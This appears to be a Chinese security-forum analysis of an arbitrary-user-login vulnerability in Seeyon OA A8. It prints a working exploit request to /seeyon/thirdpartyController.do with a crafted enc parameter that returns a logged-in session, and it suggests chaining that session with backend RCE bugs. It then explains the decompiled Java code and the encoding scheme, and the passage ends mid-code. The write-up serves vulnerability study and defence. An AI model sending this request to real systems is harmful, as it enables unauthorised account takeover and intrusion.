<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="1d767f629dcd4fef1fc95811f086f800">致远OA A8-V5 任意用户登录漏洞分析</h3>
<h4 data-content="1" id="1023c14b7720e7b22a9c2ea3dccc36ea">漏洞环境</h4>
<p>致远A8 V7.0</p>
<h4 data-content="1" id="69ebd77e1f52e66930ebcaba1fe21778">漏洞利用</h4>
<p>接口 <code>/seeyon/thirdpartyController.do</code></p>
<div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">seeyon</span><span class="o">/</span><span class="n">thirdpartyController</span><span class="o">.</span><span class="na">do</span><span class="o">?</span><span class="n">method</span><span class="o">=</span><span class="n">access</span><span class="o">&amp;</span><span class="n">enc</span><span class="o">=</span><span class="n">TT5uZnR0YmhmL21qb2wvY2N0L3BxZm8nTj4uODM4NDE0MzEyNDM0NTg1OTI3OSdVPjo6Ojo6Ojo6Ojo6Ojo</span><span class="o">=</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host:</span> <span class="mf">192.168.0.109</span>
<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="o">:</span> <span class="mi">1</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="o">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="o">;</span> <span class="n">Win64</span><span class="o">;</span> <span class="n">x64</span><span class="o">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="o">(</span><span class="n">KHTML</span><span class="o">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="o">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">112.0.0.0</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nl">Accept:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="o">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="o">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="o">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="o">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="o">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="o">,*/*;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="o">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="o">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="o">,</span> <span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="o">,</span><span class="n">zh</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
<span class="nl">Connection:</span> <span class="n">close</span>
</pre></div>
<p>可以在响应包中得到一个<code>JSESSIONID</code>，在携带<code>JSESSIONID</code> 访问<code>/seeyon/online.do</code>接口进行验证。</p>
<div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">seeyon</span><span class="o">/</span><span class="n">online</span><span class="o">.</span><span class="na">do</span><span class="o">?</span><span class="n">method</span><span class="o">=</span><span class="n">showOnlineUser</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host:</span> <span class="mf">192.168.0.103</span>
<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="o">:</span> <span class="mi">1</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="o">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="o">;</span> <span class="n">Win64</span><span class="o">;</span> <span class="n">x64</span><span class="o">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="o">(</span><span class="n">KHTML</span><span class="o">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="o">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">112.0.0.0</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nl">Accept:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="o">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="o">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="o">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="o">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="o">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="o">,*/*;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="o">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="o">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="o">,</span> <span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="o">,</span><span class="n">zh</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
<span class="nl">Cookie:</span> <span class="n">JSESSIONID</span><span class="o">=</span><span class="mi">8</span><span class="n">C078E76C97C408221F7CD808AF28932</span><span class="o">;</span> <span class="n">loginPageURL</span><span class="o">=;</span> <span class="n">avatarImageUrl</span><span class="o">=-</span><span class="mi">7273032013234748168</span>
<span class="nl">Connection:</span> <span class="n">close</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180215-1fec3126-cfd7-1.png"/></p>
<p>可用该<code>JSESSIONID</code>访问需要登录的接口，配合后台一些RCE漏洞进行利用。</p>
<h4 data-content="1" id="02b46f616e147925d9f02ca1998987d4">漏洞分析</h4>
<p>在源码中全局搜索<code>thirdpartyController</code> 关键字</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180222-23eb126a-cfd7-1.png"/></p>
<p>可以根据路由接口找到对应配置文件中类文件的映射，跟入到<code>com.seeyon.ctp.portal.sso.thirdpartyintegration.controller.ThirdpartyController</code>中。</p>
<p>根据exp可以得知调用了该类的<code>access</code>方法。</p>
<p>在这个方法中代码还是比较多，我做了一些简化，保留了关键的几个代码片段。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">ModelAndView</span> <span class="nf">access</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="n">ModelAndView</span> <span class="n">mv</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ModelAndView</span><span class="o">(</span><span class="s">"thirdparty/thirdpartyAccess"</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">enc</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"enc"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">enc</span> <span class="o">=</span> <span class="n">LightWeightEncoder</span><span class="o">.</span><span class="na">decodeString</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"enc"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">" "</span><span class="o">,</span> <span class="s">"+"</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">transcode</span> <span class="o">=</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">().</span><span class="na">split</span><span class="o">(</span><span class="s">"enc="</span><span class="o">)[</span><span class="mi">1</span><span class="o">]);</span>
            <span class="n">enc</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">().</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"enc="</span><span class="o">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="n">LightWeightEncoder</span><span class="o">.</span><span class="na">decodeString</span><span class="o">(</span><span class="n">transcode</span><span class="o">)</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">enc</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.wuxiao"</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">encMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
            <span class="n">String</span><span class="o">[]</span> <span class="n">enc0</span> <span class="o">=</span> <span class="n">enc</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"[&amp;]"</span><span class="o">);</span>
            <span class="n">String</span><span class="o">[]</span> <span class="n">link</span> <span class="o">=</span> <span class="n">enc0</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">var14</span> <span class="o">=</span> <span class="n">enc0</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

            <span class="n">String</span> <span class="n">path</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">startTimeStr</span><span class="o">;</span>
            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var15</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var15</span> <span class="o">&lt;</span> <span class="n">var14</span><span class="o">;</span> <span class="o">++</span><span class="n">var15</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">enc1</span> <span class="o">=</span> <span class="n">link</span><span class="o">[</span><span class="n">var15</span><span class="o">];</span>
                <span class="n">String</span><span class="o">[]</span> <span class="n">enc2</span> <span class="o">=</span> <span class="n">enc1</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"[=]"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">enc2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">path</span> <span class="o">=</span> <span class="n">enc2</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
                    <span class="n">startTimeStr</span> <span class="o">=</span> <span class="n">enc2</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="n">enc2</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
                    <span class="k">if</span> <span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">startTimeStr</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">startTimeStr</span> <span class="o">=</span> <span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">startTimeStr</span><span class="o">);</span>
                        <span class="n">startTimeStr</span> <span class="o">=</span> <span class="n">startTimeStr</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"%3F"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
                        <span class="n">startTimeStr</span> <span class="o">=</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">startTimeStr</span><span class="o">);</span>
                    <span class="o">}</span>

                    <span class="n">encMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">startTimeStr</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="n">link</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="kt">long</span> <span class="n">memberId</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1L</span><span class="o">;</span>
            <span class="n">Constants</span><span class="o">.</span><span class="na">login_useragent_from</span> <span class="n">userAgentFrom</span> <span class="o">=</span> <span class="n">login_useragent_from</span><span class="o">.</span><span class="na">pc</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">linkType</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"L"</span><span class="o">);</span>
            <span class="n">path</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"P"</span><span class="o">);</span>
            <span class="n">Long</span> <span class="n">timeStamp</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">link</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">Strings</span><span class="o">.</span><span class="na">isNotBlank</span><span class="o">(</span><span class="n">linkType</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">startTimeStr</span> <span class="o">=</span> <span class="s">"0"</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">encMap</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="s">"T"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">startTimeStr</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"T"</span><span class="o">);</span>
                    <span class="n">startTimeStr</span> <span class="o">=</span> <span class="n">startTimeStr</span><span class="o">.</span><span class="na">trim</span><span class="o">();</span>
                <span class="o">}</span>

                <span class="n">timeStamp</span> <span class="o">=</span> <span class="mi">0</span><span class="n">L</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">NumberUtils</span><span class="o">.</span><span class="na">isNumber</span><span class="o">(</span><span class="n">startTimeStr</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">timeStamp</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">startTimeStr</span><span class="o">);</span>
                <span class="o">}</span>

                <span class="k">if</span> <span class="o">((</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">timeStamp</span><span class="o">)</span> <span class="o">/</span> <span class="mi">1000L</span> <span class="o">&gt;</span> <span class="o">(</span><span class="kt">long</span><span class="o">)(</span><span class="k">this</span><span class="o">.</span><span class="na">messageMailManager</span><span class="o">.</span><span class="na">getContentLinkValidity</span><span class="o">()</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.guoqi"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                <span class="o">}</span>

                <span class="n">String</span> <span class="n">_memberId</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"M"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">_memberId</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.wuxiao"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                <span class="o">}</span>

                <span class="n">memberId</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">_memberId</span><span class="o">);</span>
                <span class="n">link</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">UserMessageUtil</span><span class="o">.</span><span class="na">getMessageLinkType</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">linkType</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">link</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.wuxiao"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                <span class="o">}</span>


            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>


            <span class="k">if</span> <span class="o">(</span><span class="n">memberId</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1L</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.noUser"</span><span class="o">);</span>
                <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="kt">boolean</span> <span class="n">isNeedLogout</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
                <span class="kt">long</span> <span class="n">time2</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
                <span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"Param耗时"</span> <span class="o">+</span> <span class="o">(</span><span class="n">time2</span> <span class="o">-</span> <span class="n">time1</span><span class="o">)</span> <span class="o">+</span> <span class="s">"MS"</span><span class="o">);</span>
                <span class="n">User</span> <span class="n">currentUser</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"com.seeyon.current_user"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">currentUser</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">currentUser</span><span class="o">.</span><span class="na">isDefaultGuest</span><span class="o">())</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">currentUser</span><span class="o">.</span><span class="na">getId</span><span class="o">()</span> <span class="o">!=</span> <span class="n">memberId</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.exists"</span><span class="o">);</span>
                        <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                    <span class="o">}</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">V3xOrgMember</span> <span class="n">member</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">orgManager</span><span class="o">.</span><span class="na">getMemberById</span><span class="o">(</span><span class="n">memberId</span><span class="o">);</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">member</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.noUser"</span><span class="o">);</span>
                        <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                    <span class="o">}</span>

                    <span class="n">LocaleContext</span><span class="o">.</span><span class="na">setLocale</span><span class="o">(</span><span class="n">session</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">orgManagerDirect</span><span class="o">.</span><span class="na">getMemberLocaleById</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getId</span><span class="o">()));</span>
                    <span class="n">currentUser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setLoginTimestamp</span><span class="o">(</span><span class="n">loginTime</span><span class="o">);</span>
                    <span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"com.seeyon.current_user"</span><span class="o">,</span> <span class="n">currentUser</span><span class="o">);</span>
                    <span class="n">AppContext</span><span class="o">.</span><span class="na">putThreadContext</span><span class="o">(</span><span class="s">"SESSION_CONTEXT_USERINFO_KEY"</span><span class="o">,</span> <span class="n">currentUser</span><span class="o">);</span>
                    <span class="n">AppContext</span><span class="o">.</span><span class="na">initSystemEnvironmentContext</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setSecurityKey</span><span class="o">(</span><span class="n">UUIDLong</span><span class="o">.</span><span class="na">longUUID</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="n">memberId</span><span class="o">);</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setLoginName</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getLoginName</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setAccountId</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getOrgAccountId</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setLoginAccount</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getOrgAccountId</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setDepartmentId</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getOrgDepartmentId</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setLevelId</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getOrgLevelId</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setPostId</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getOrgPostId</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setInternal</span><span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">getIsInternal</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setUserAgentFrom</span><span class="o">(</span><span class="n">userAgentFrom</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setSessionId</span><span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getId</span><span class="o">());</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setRemoteAddr</span><span class="o">(</span><span class="n">Strings</span><span class="o">.</span><span class="na">getRemoteAddr</span><span class="o">(</span><span class="n">request</span><span class="o">));</span>
                    <span class="n">currentUser</span><span class="o">.</span><span class="na">setLocale</span><span class="o">(</span><span class="n">locale</span><span class="o">);</span>
                    <span class="n">BrowserEnum</span> <span class="n">browser</span> <span class="o">=</span> <span class="n">BrowserEnum</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
                <span class="o">....</span> <span class="n">忽略了</span>

                <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180232-2a30f0cc-cfd7-1.png"/></p>
<p>首先，在代码的276行处，接收了enc参数并使用<code>LightWeightEncoder.decodeString</code>进行解码，跟入到该方法中。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">decodeString</span><span class="o">(</span><span class="n">String</span> <span class="n">encodeString</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">encodeString</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">encodeString</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">((</span><span class="k">new</span> <span class="n">Base64</span><span class="o">()).</span><span class="na">decode</span><span class="o">(</span><span class="n">encodeString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
            <span class="o">}</span>

            <span class="kt">char</span><span class="o">[]</span> <span class="n">encodeStringCharArray</span> <span class="o">=</span> <span class="n">encodeString</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">();</span>

            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encodeStringCharArray</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
                <span class="o">--</span><span class="n">encodeStringCharArray</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">encodeStringCharArray</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></div>
<p>这个方法功能是对传入的字符串进行base64解码，然后再将解码后的字符串每一个字符向后移动一位。</p>
<p>如传入<code>bcd</code>-&gt;<code>base64编码</code>-&gt;<code>调用decodeString</code>-&gt;<code>abc</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180238-2da6d26c-cfd7-1.png"/></p>
<p>很简单，接下来往下面看。</p>
<p>在286-307行处</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180316-441eb7bc-cfd7-1.png"/></p>
<p>这段代码是对经过经过<code>decodeString</code>解码后的值做一个分割操作，首先是将enc的值通过<code>&amp;</code>分割成一个字符串列表，然后再进行遍历，再根据<code>=</code>再次分割字符串，将<code>=</code>前的值作为key放入encMap中，<code>=</code>后面的作为key的值 。如<code>test=1&amp;test2=2&amp;test3=3</code>，就会被拆成<code>{"test": 1，"test2": 2, "test3": 3}</code>。</p>
<p>再往下边看。</p>
<div class="highlight"><pre><span></span><span class="n">Constants</span><span class="o">.</span><span class="na">login_useragent_from</span> <span class="n">userAgentFrom</span> <span class="o">=</span> <span class="n">login_useragent_from</span><span class="o">.</span><span class="na">pc</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">linkType</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"L"</span><span class="o">);</span>
            <span class="n">path</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"P"</span><span class="o">);</span>
            <span class="n">Long</span> <span class="n">timeStamp</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">link</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">Strings</span><span class="o">.</span><span class="na">isNotBlank</span><span class="o">(</span><span class="n">linkType</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">startTimeStr</span> <span class="o">=</span> <span class="s">"0"</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">encMap</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="s">"T"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">startTimeStr</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"T"</span><span class="o">);</span>
                    <span class="n">startTimeStr</span> <span class="o">=</span> <span class="n">startTimeStr</span><span class="o">.</span><span class="na">trim</span><span class="o">();</span>
                <span class="o">}</span>

                <span class="n">timeStamp</span> <span class="o">=</span> <span class="mi">0</span><span class="n">L</span><span class="o">;</span>
